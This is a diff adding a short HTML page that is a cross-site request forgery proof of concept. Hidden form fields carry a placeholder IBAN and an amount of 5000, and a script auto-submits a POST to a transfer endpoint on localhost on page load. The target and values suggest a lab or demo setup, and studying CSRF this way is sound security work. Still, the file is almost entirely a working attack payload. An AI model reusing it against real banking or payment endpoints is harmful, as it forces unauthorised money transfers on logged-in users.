@@ -1,0 +1,13 @@
+<!doctype html>
+<html lang="en">
+  <body>
+    <form action="http://localhost:3002/transfer" method="POST">
+      <input type="hidden" name="iban" value="TR000000000000000000000001" />
+      <input type="hidden" name="amount" value="5000" />
+      <button type="submit">Send forged transfer</button>
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
